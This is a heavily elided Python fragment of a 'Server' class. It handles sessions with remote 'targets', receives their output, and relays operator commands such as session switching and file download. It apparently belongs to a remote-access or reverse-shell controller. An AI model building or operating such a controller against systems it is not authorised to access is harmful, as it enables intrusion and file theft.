...
class Server:
    ...
    def reliable_receive(self, target):
        ...
        while True:
            try:
                data = data + target.recv(6024).decode().rstrip()
        ...
        while not self.stop_event.is_set():
            ...
            try:
                ...
                if command == "session":
                    ...
                    continue
                if command == "clear":
                    print(f"[+] clear executed")
                    os.system("clear")
                    continue
                if command == "switchsession":
                    self.handle_SessionSwitch()
                    continue
                if command[:8] == "download":  # downlaod file.txt
                    self.reliable_Send(self.default_target, command)
                ...
                while True:
                    ...
                    rlist, _, _ = select.select([self.default_target], [], [])
